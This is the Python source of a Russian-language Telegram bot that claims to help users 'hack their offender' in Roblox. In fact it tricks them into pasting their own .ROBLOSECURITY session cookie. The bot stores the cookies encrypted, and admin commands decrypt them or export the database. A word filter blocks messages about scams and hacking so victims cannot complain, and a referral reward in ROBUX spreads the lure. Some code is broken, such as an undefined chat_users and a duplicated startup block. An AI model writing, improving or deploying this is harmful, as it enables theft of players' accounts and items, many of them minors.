import telebot
import time
import sqlite3
import hashlib
import random
import string
import signal
import sys
import os
from cryptography.fernet import Fernet

# Получаем токен бота из переменных окружения
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен!")

bot = telebot.TeleBot(BOT_TOKEN)

# Получаем ID администраторов из переменных окружения
ADMIN_IDS_STR = os.environ.get('ADMIN_IDS')
if not ADMIN_IDS_STR:
    raise ValueError("ADMIN_IDS не установлен!")
admin_ids = [int(id.strip()) for id in ADMIN_IDS_STR.split(',')]

# Шифрование для куков
ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY')
if ENCRYPTION_KEY:
    try:
        cipher = Fernet(ENCRYPTION_KEY.encode() if isinstance(ENCRYPTION_KEY, str) else ENCRYPTION_KEY)
    except:
        print("⚠️ ENCRYPTION_KEY невалидный! Генерируем новый...")
        temp_key = Fernet.generate_key()
        cipher = Fernet(temp_key)
        print(f"⚠️ Добавьте в переменные окружения: ENCRYPTION_KEY={temp_key.decode()}")
else:
    # Генерируем ключ если не задан
    print("⚠️ ENCRYPTION_KEY не задан! Генерируем новый ключ...")
    temp_key = Fernet.generate_key()
    cipher = Fernet(temp_key)
    print(f"⚠️ Скопируйте и добавьте в Apply.build переменную:")
    print(f"ENCRYPTION_KEY={temp_key.decode()}")

# Путь к файлу базы данных SQLite
DATABASE_FILE = "user_database.db"

# Словарь для хранения состояния бана/разбана
ban_state = {}
# Словарь для хранения состояния добавления админа
admin_add_state = {}
# Словарь для хранения состояния удаления админа
admin_remove_state = {}
# Словарь для хранения состояния пробива
probiv_state = {}

# Список запрещенных слов
banned_words = ["меня взломали", "скам", "скамят", "scam", "обман", "обманули"]

# Функция генерации уникального номера
def generate_unique_id(length=4):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def create_database():
    """Создает таблицу users, если она не существует."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            invite TEXT,
            referrer_id INTEGER,
            balance INTEGER DEFAULT 0,
            unique_id TEXT UNIQUE,
            last_interaction INTEGER,
            banned INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0
        )
    """)
    # Таблица для хранения зашифрованных куков
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS cookies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            unique_id TEXT,
            encrypted_cookie TEXT,
            created_at INTEGER,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    """)
    conn.commit()
    conn.close()

def generate_referral_code(user_id):
    """Генерирует уникальный реферальный код для пользователя."""
    hash_object = hashlib.sha256(str(user_id).encode())
    hex_dig = hash_object.hexdigest()
    return hex_dig[:8] # Первые 8 символов хеша

def add_user_to_database(user_id, username, invite, referrer_id=None):
    """Добавляет пользователя в базу данных, если его там нет."""
    unique_id = generate_unique_id()
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if cursor.fetchone() is None:
         cursor.execute("INSERT INTO users (user_id, username, invite, referrer_id, unique_id, last_interaction) VALUES (?, ?, ?, ?, ?, ?)",
                       (user_id, username, invite, referrer_id, unique_id, int(time.time())))
         conn.commit()
         if referrer_id:
            cursor.execute("UPDATE users SET balance = balance + 10 WHERE user_id = ?", (referrer_id,))
            conn.commit() # Начисляем 10 робуксов за рефа
         conn.close()
         return True # Вернуть True, если пользователь успешно добавлен
    else:
        cursor.execute("UPDATE users SET last_interaction = ? WHERE user_id = ?", (int(time.time()), user_id))
        conn.commit()
        conn.close()
        return False  # Вернуть False, если пользователь уже есть в бд

def get_user_info(user_id):
    """Возвращает информацию о пользователе из базы данных."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT username, invite, balance, unique_id, banned, is_admin FROM users WHERE user_id = ?", (user_id,))
    user_info = cursor.fetchone()
    conn.close()
    return user_info

def get_referral_count(user_id):
    """Возвращает количество рефералов у пользователя."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,))
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_all_user_ids():
    """Возвращает список всех user_id из базы данных."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    user_ids = [row[0] for row in cursor.fetchall()]
    conn.close()
    return user_ids

def get_user_by_unique_id(unique_id):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username FROM users WHERE unique_id = ?", (unique_id,))
    result = cursor.fetchone()
    conn.close()
    return result if result else None

def get_user_by_username(username):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, unique_id FROM users WHERE username = ?", (username,))
    result = cursor.fetchone()
    conn.close()
    return result if result else None

def get_last_users(limit=7):
    """Получает последние N пользователей, отсортированных по времени последнего взаимодействия."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT username, unique_id FROM users ORDER BY last_interaction DESC LIMIT ?", (limit,))
    users = cursor.fetchall()
    conn.close()
    return users

def get_total_user_count():
    """Возвращает общее количество пользователей в базе данных."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def is_user_banned(user_id):
    """Проверяет, забанен ли пользователь."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] == 1 if result else False

def ban_user(unique_id):
    """Банит пользователя по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET banned = 1 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def unban_user(unique_id):
    """Разбанивает пользователя по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET banned = 0 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def set_admin(unique_id):
    """Дает права админа пользователю по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def remove_admin(unique_id):
    """Убирает права админа у пользователя по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET is_admin = 0 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def is_user_admin(user_id):
    """Проверяет, является ли пользователь админом."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] == 1 if result else False

def filter_message(message):
    """Проверяет сообщение на наличие запрещенных слов."""
    message_lower = message.lower()
    for word in banned_words:
        if word.lower() in message_lower:
            return False
    return True

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if is_user_banned(user_id):
          bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
          return
    username = message.from_user.username

    # Проверяем, есть ли реферальный код в параметрах
    if len(message.text.split()) > 1:
        referral_code = message.text.split()[1]
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users WHERE username = ?", (referral_code,))
        referrer = cursor.fetchone()
        conn.close()
        if referrer:
            referrer_id = referrer[0]
            if add_user_to_database(user_id, username, referral_code, referrer_id):
                 send_main_menu(message.chat.id, user_id)
            else:
                 send_main_menu(message.chat.id, user_id)
                 bot.send_message(message.chat.id, "Упсс.. Вы уже воспользовались ботом!")
                 return
        else:
           if add_user_to_database(user_id, username, "start"):
               send_main_menu(message.chat.id, user_id)
           else:
                send_main_menu(message.chat.id, user_id)
                return
    else:
         if add_user_to_database(user_id, username, "start"):
              send_main_menu(message.chat.id, user_id)
         else:
             send_main_menu(message.chat.id, user_id)
             return

def send_main_menu(chat_id, user_id=None):
    """Отправляет главное меню с кнопками."""
    markup = generate_main_keyboard(user_id)
    welcome_text = (
        "👋 Привет! Хочешь взломать обидчика в Roblox? Тебе к нам!\n\n"
        "📺 Посмотри этот видео-ролик, в нём рассказано, как получить данные твоего обидчика.\n"
        "Как досмотришь видео, нажимай кнопку 'Получить пароль' ниже и вставляй сюда копируемые тобой данные.\n\n"
        "🎥 https://youtu.be/m3wfiX3o9Eo"
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

def generate_main_keyboard(user_id=None):
    """Создает клавиатуру с кнопками. Для админов добавляет кнопку админ-панели."""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    button_get_pass = telebot.types.KeyboardButton(text='Получить пароль')
    button_profile = telebot.types.KeyboardButton(text='Профиль')
    
    # Проверяем является ли пользователь админом
    if user_id and (user_id in admin_ids or is_user_admin(user_id)):
        button_admin = telebot.types.KeyboardButton(text='⚙️ Админ-панель')
        markup.add(button_get_pass, button_profile)
        markup.add(button_admin)
    else:
        markup.add(button_get_pass, button_profile)
    
    return markup

@bot.message_handler(func=lambda message: message.text == "Получить пароль")
def get_pass_button_clicked(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    bot.send_message(message.chat.id, "Вставьте сюда данные", reply_markup=telebot.types.ReplyKeyboardRemove()) # Убирает клаву

@bot.message_handler(func=lambda message: message.text == "Профиль")
def handle_profile_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    user_id = message.from_user.id
    user_info = get_user_info(user_id)
    if user_info:
       username, invite, balance, unique_id, banned, is_admin = user_info
       referral_count = get_referral_count(user_id)
       ref_link = f"https://t.me/{bot.get_me().username}?start={username}"

       profile_message = f"👍 Здравствуйте, {message.from_user.first_name}\n"
       profile_message += f"📈 Приведено человек: {referral_count}\n"
       profile_message += f"💲 Баланс: {balance} ROBUX\n"
       profile_message += f"🔋 Ваша рефка: {ref_link}\n"
       profile_message += f"🆔 Ваш ID: {unique_id}"
       if is_admin:
          profile_message += "\n👑 Вы являетесь администратором."

       bot.send_message(message.chat.id, profile_message)
    else:
        bot.send_message(message.chat.id, "Упс.. Что-то пошло не так!")

@bot.message_handler(func=lambda message: message.text == "⚙️ Админ-панель")
def handle_admin_panel_button(message):
    """Обработчик кнопки админ-панели"""
    admin_panel(message)



@bot.message_handler(func=lambda message: message.text.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"))
def handle_pass(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    
    user_id = message.from_user.id
    username = message.from_user.username
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT unique_id FROM users WHERE user_id = ?", (user_id,))
    unique_id_row = cursor.fetchone()
    
    if not unique_id_row:
        conn.close()
        bot.send_message(message.chat.id, "Ошибка! Сначала выполните /start")
        return
    
    unique_id = unique_id_row[0]
    
    # Шифруем куки
    encrypted_cookie = cipher.encrypt(message.text.encode()).decode()
    
    # Сохраняем в БД
    cursor.execute("""
        INSERT INTO cookies (user_id, username, unique_id, encrypted_cookie, created_at)
        VALUES (?, ?, ?, ?, ?)
    """, (user_id, username, unique_id, encrypted_cookie, int(time.time())))
    conn.commit()
    conn.close()

    # Отправляем уведомление администраторам (БЕЗ куков!)
    for admin_id in admin_ids:
        bot.send_message(
            admin_id, 
            f"🆕 Новая заявка\n"
            f"👤 @{username}\n"
            f"🆔 {unique_id}\n"
            f"⏰ {time.strftime('%H:%M:%S', time.localtime())}\n\n"
            f"🔐 Данные зашифрованы и сохранены в БД\n"
            f"Используйте /getcookie {unique_id} для просмотра"
        )

    # Отправляем сообщение пользователю о принятии заявки
    bot.send_message(message.chat.id, "✅ Ваша заявка успешно принята! Ожидайте сообщение от наших модераторов.")


@bot.message_handler(commands=['con'])
def handle_con_command(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        unique_id = message.text.split()[1]
        user_info = get_user_by_unique_id(unique_id)
        if user_info:
            user_id = user_info[0]
            bot.send_message(message.chat.id, f"Подключен к пользователю с ID: {user_id}")
        else:
            bot.reply_to(message, "Неверный уникальный ID.")
    else:
        bot.reply_to(message, "У вас нет прав на использование этой команды.")

@bot.message_handler(commands=['getcookie'])
def handle_getcookie_command(message):
    """Команда для получения расшифрованных куков (только для админов)"""
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте.")
        return
    
    if message.from_user.id not in admin_ids and not is_user_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав на использование этой команды.")
        return
    
    try:
        unique_id = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Использование: /getcookie <unique_id>")
        return
    
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT encrypted_cookie, username, created_at 
        FROM cookies 
        WHERE unique_id = ? 
        ORDER BY created_at DESC 
        LIMIT 1
    """, (unique_id,))
    
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        bot.reply_to(message, "❌ Куки не найдены для этого ID")
        return
    
    encrypted_cookie, username, created_at = result
    
    try:
        # Расшифровываем
        decrypted_cookie = cipher.decrypt(encrypted_cookie.encode()).decode()
        
        bot.send_message(
            message.chat.id,
            f"🔓 Расшифрованные данные\n"
            f"👤 @{username}\n"
            f"🆔 {unique_id}\n"
            f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(created_at))}\n\n"
            f"```\n{decrypted_cookie}\n```",
            parse_mode='Markdown'
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка расшифровки: {e}")

@bot.message_handler(commands=['getdb'])
def handle_getdb_command(message):
    """Отправляет файл базы данных админу"""
    if message.from_user.id not in admin_ids and not is_user_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав")
        return
    
    try:
        with open(DATABASE_FILE, 'rb') as db_file:
            bot.send_document(message.chat.id, db_file, caption="📁 База данных")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['msg'])
def handle_msg_command(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
      parts = message.text.split(maxsplit=1) #Разбиваем текст по первому пробелу
      if len(parts) < 2:
            bot.reply_to(message, "Неверный формат. Использование /msg unique_id сообщение")
            return
      unique_id = parts[1].split()[0] #берем юник ид
      text_message = parts[1][len(unique_id):].strip() #Берем оставшийся текст

      user_info = get_user_by_unique_id(unique_id)
      if user_info:
        user_id = user_info[0]
        bot.send_message(user_id, text_message)
      else:
          bot.reply_to(message, "Неверный уникальный ID.")

    elif message.text.startswith('/msg moder'):
          text_message = message.text[len('/msg moder'):].strip()
          for admin_id in admin_ids:
             user_info = get_user_info(message.from_user.id)
             if user_info:
                bot.send_message(admin_id, f"@{message.from_user.username} {user_info[3]}\n{text_message}")
             else:
                 bot.send_message(admin_id, f"@{message.from_user.username}\n{text_message}")
    else:
        bot.reply_to(message, "У вас нет прав на использование этой команды.")

@bot.message_handler(commands=['admins'])
def admin_panel(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button_users = telebot.types.KeyboardButton(text='👩‍👦Люди')
        button_broadcast = telebot.types.KeyboardButton(text='📢Рассылка')
        button_ban = telebot.types.KeyboardButton(text='⛔️Забанить')
        button_unban = telebot.types.KeyboardButton(text='✅Разбанить')
        button_add_admin = telebot.types.KeyboardButton(text='👑Сделать админом')
        button_remove_admin = telebot.types.KeyboardButton(text='❌Удалить админа')
        button_probiv = telebot.types.KeyboardButton(text='🔍Пробив')
        markup.add(button_users, button_broadcast, button_ban, button_unban, button_add_admin, button_remove_admin, button_probiv)
        bot.send_message(message.chat.id, "Админ-панель", reply_markup=markup)
    else:
        bot.reply_to(message, "❌ У вас нет прав.")

@bot.message_handler(func=lambda message: message.text == "👩‍👦Люди")
def handle_users_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        total_users = get_total_user_count()
        last_users = get_last_users(10)

        response = f"Всего пользователей: {total_users}\n\n"
        if last_users:
            response += "Последние 10 пользователей:\n"
            for user in last_users:
                response += f"@{user[0]} - {user[1]}\n"
        else:
            response += "Нет пользователей."

        bot.send_message(message.chat.id, response, reply_markup = telebot.types.ReplyKeyboardRemove())

# Словарь для хранения состояния рассылки
broadcast_state = {}

@bot.message_handler(func=lambda message: message.text == "📢Рассылка")
def handle_broadcast_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Напишите текст для рассылки, firstname:", reply_markup = telebot.types.ReplyKeyboardRemove())
        broadcast_state[message.chat.id] = "awaiting_text"

@bot.message_handler(func=lambda message: message.chat.id in broadcast_state and broadcast_state[message.chat.id] == "awaiting_text")
def handle_broadcast_text(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    user_ids = get_all_user_ids()
    for user_id in user_ids:
        try:
            bot.send_message(user_id, message.text)
        except Exception as e:
           print(f"Не удалось отправить сообщение пользователю {user_id}: {e}")
    bot.send_message(message.chat.id, "Рассылка завершена", reply_markup = telebot.types.ReplyKeyboardRemove())
    del broadcast_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "⛔️Забанить")
def handle_ban_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Напишите уникальный ID пользователя, которого нужно забанить:", reply_markup = telebot.types.ReplyKeyboardRemove())
        ban_state[message.chat.id] = "awaiting_ban_id"

@bot.message_handler(func=lambda message: message.chat.id in ban_state and ban_state[message.chat.id] == "awaiting_ban_id")
def handle_ban_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if ban_user(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} был забанен.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del ban_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "✅Разбанить")
def handle_unban_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Напишите уникальный ID пользователя, которого нужно разбанить:", reply_markup = telebot.types.ReplyKeyboardRemove())
        ban_state[message.chat.id] = "awaiting_unban_id"

@bot.message_handler(func=lambda message: message.chat.id in ban_state and ban_state[message.chat.id] == "awaiting_unban_id")
def handle_unban_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if unban_user(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} был разбанен.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del ban_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "👑Сделать админом")
def handle_add_admin_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Введите уникальный ID пользователя, которого нужно сделать администратором:", reply_markup = telebot.types.ReplyKeyboardRemove())
        admin_add_state[message.chat.id] = "awaiting_add_admin_id"

@bot.message_handler(func=lambda message: message.chat.id in admin_add_state and admin_add_state[message.chat.id] == "awaiting_add_admin_id")
def handle_add_admin_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if set_admin(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} теперь является администратором.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del admin_add_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "❌Удалить админа")
def handle_remove_admin_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Введите уникальный ID пользователя, которого нужно лишить прав администратора:", reply_markup = telebot.types.ReplyKeyboardRemove())
        admin_remove_state[message.chat.id] = "awaiting_remove_admin_id"

@bot.message_handler(func=lambda message: message.chat.id in admin_remove_state and admin_remove_state[message.chat.id] == "awaiting_remove_admin_id")
def handle_remove_admin_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if remove_admin(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} больше не является администратором.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del admin_remove_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "🔍Пробив")
def handle_probiv_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button_by_username = telebot.types.KeyboardButton(text='По @юз')
        button_by_unique_id = telebot.types.KeyboardButton(text='По уникальному ID')
        markup.add(button_by_username, button_by_unique_id)
        bot.send_message(message.chat.id, "Выберите тип поиска:", reply_markup=markup)
        probiv_state[message.chat.id] = "awaiting_probiv_type"

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_type" and message.text == "По @юз")
def handle_probiv_by_username(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    bot.send_message(message.chat.id, "Введите @юз пользователя:", reply_markup=telebot.types.ReplyKeyboardRemove())
    probiv_state[message.chat.id] = "awaiting_probiv_username"

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_username")
def handle_probiv_username_input(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    username = message.text.replace("@", "")
    user_info = get_user_by_username(username)
    if user_info:
       user_id, unique_id = user_info
       user_data = get_user_info(user_id)
       if user_data:
          username, invite, balance, unique_id, banned, is_admin = user_data
          referral_count = get_referral_count(user_id)
          ref_link = f"https://t.me/{bot.get_me().username}?start={username}"

          profile_message = f"👍 Информация о {message.from_user.first_name} (@{username})\n"
          profile_message += f"📈 Приведено человек: {referral_count}\n"
          profile_message += f"💲 Баланс: {balance} ROBUX\n"
          profile_message += f"🔋 Ваша рефка: {ref_link}\n"
          profile_message += f"🆔 ID: {unique_id}"

          bot.send_message(message.chat.id, profile_message)
       else:
            bot.send_message(message.chat.id, "Ошибка получения данных пользователя.", reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Пользователь с таким @юзом не найден.", reply_markup=telebot.types.ReplyKeyboardRemove())
    del probiv_state[message.chat.id]

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_type" and message.text == "По уникальному ID")
def handle_probiv_by_unique_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    bot.send_message(message.chat.id, "Введите уникальный ID пользователя:", reply_markup=telebot.types.ReplyKeyboardRemove())
    probiv_state[message.chat.id] = "awaiting_probiv_unique_id"

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_unique_id")
def handle_probiv_unique_id_input(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id, username = user_info
       user_data = get_user_info(user_id)
       if user_data:
          username, invite, balance, unique_id, banned, is_admin = user_data
          referral_count = get_referral_count(user_id)
          ref_link = f"https://t.me/{bot.get_me().username}?start={username}"

          profile_message = f"👍 Информация о {message.from_user.first_name} (@{username})\n"
          profile_message += f"📈 Приведено человек: {referral_count}\n"
          profile_message += f"💲 Баланс: {balance} ROBUX\n"
          profile_message += f"🔋 Ваша рефка: {ref_link}\n"
          profile_message += f"🆔 юз: @{username} ({unique_id})"

          bot.send_message(message.chat.id, profile_message)
       else:
            bot.send_message(message.chat.id, "Ошибка получения данных пользователя.", reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Пользователь с таким уникальным ID не найден.", reply_markup=telebot.types.ReplyKeyboardRemove())
    del probiv_state[message.chat.id]


@bot.message_handler(func=lambda message: message.chat.id in chat_users and message.text)
def handle_chat_message(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if filter_message(message.text):
      username = message.from_user.username
      for user_id in chat_users:
          if user_id != message.from_user.id:
              try:
                  bot.send_message(user_id, f"@{username}: {message.text}")
              except Exception as e:
                  print(f"Не удалось отправить сообщение пользователю {user_id}: {e}")
    else:
        bot.send_message(message.chat.id, "Ваше сообщение заблокировано!")

def signal_handler(sig, frame):
    print('Выход...')
    bot.stop_polling()
    sys.exit(0)

# Установка обработчика сигналов
signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    print("Запуск бота...")
    print(f"ID администраторов: {admin_ids}")
    
    # Создаем базу данных при запуске
    create_database()
    print("База данных инициализирована")
    
    # Запускаем бота
    print("Бот запущен и готов к работе!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

def signal_handler(sig, frame):
    print('Выход...')
    bot.stop_polling()
    sys.exit(0)

# Установка обработчика сигналов
signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    print("Запуск бота...")
    print(f"ID администраторов: {admin_ids}")
    
    # Создаем базу данных при запуске
    create_database()
    print("База данных инициализирована")
    
    # Запускаем бота
    print("Бот запущен и готов к работе!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
